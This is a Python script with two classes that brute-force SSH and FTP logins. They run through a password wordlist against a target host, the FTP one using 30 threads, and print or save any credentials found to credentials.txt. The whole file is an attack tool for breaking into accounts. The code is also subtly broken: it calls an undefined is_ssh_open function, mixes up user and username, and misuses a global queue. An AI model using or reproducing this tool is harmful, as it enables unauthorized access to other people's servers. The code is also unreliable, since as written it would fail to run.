#!/usr/bin/python3
# -*- coding: utf-8  -*-
from time import sleep
import time
import datetime
from datetime import datetime, date
import os
import re
import sys
from colorama import Fore, Back, Style
import terminaltables
from socket import *
import random
from scapy.all import *
import pandas
from gif_for_cli.execute import execute
from terminaltables import AsciiTable

class ssh_brutforce(object):
    """docstring for ssh_brutforce."""

    def __init__(self, host, username, passlist):
        super(ssh_brutforce, self).__init__()
        import argparse
        # read the file
        passlist = open(passlist).read().splitlines()
        # brute-force
        for password in passlist:
            if is_ssh_open(host, user, password):
                # if combo is valid, save it to a file
                print("Found Valid Combo as :", user, "with password", password)
                print("Writing it in credentials.txt")
                open("credentials.txt", "w").write(f"{user}@{host}:{password}")
                break



class ftp_bruteforce(object):
    """docstring for ftp_bruteforce."""

    def __init__(self, host, username, wordlist, port=None):
        super(ftp_bruteforce, self).__init__()
        import ftplib
        from threading import Thread
        import queue
        from colorama import Fore, init # for fancy colors, nothing else

        # init the console for colors (for Windows)
        # init()
        # initialize the queue
        q = queue.Queue()
        # number of threads to spawn
        n_threads = 30
        # port of FTP, aka 21
        if port is None:
            port = 21
        def connect_ftp():
            global q
            while True:
                # get the password from the queue
                password = q.get()
                # initialize the FTP server object
                server = ftplib.FTP()
                print("[!] Trying", password)
                try:
                    # tries to connect to FTP server with a timeout of 5
                    server.connect(host, port, timeout=5)
                    # login using the credentials (user & password)
                    server.login(user, password)
                except ftplib.error_perm:
                    # login failed, wrong credentials
                    pass
                else:
                    # correct credentials
                    print(f"{Fore.GREEN}[+] Found credentials: ")
                    print(f"\tHost: {host}")
                    print(f"\tUser: {user}")
                    print(f"\tPassword: {password}{Fore.RESET}")
                    # we found the password, let's clear the queue
                    with q.mutex:
                        q.queue.clear()
                        q.all_tasks_done.notify_all()
                        q.unfinished_tasks = 0
                finally:
                    # notify the queue that the task is completed for this password
                    q.task_done()

        # read the wordlist of passwords
        passwords = open(wordlist).read().split("\n")
        print("[+] Passwords to try:", len(passwords))
        # put all passwords to the queue
        for password in passwords:
            q.put(password)
        # create `n_threads` that runs that function
        for t in range(n_threads):
            thread = Thread(target=connect_ftp)
            # will end when the main thread end
            thread.daemon = True
            thread.start()
        # wait for the queue to be empty
        q.join()
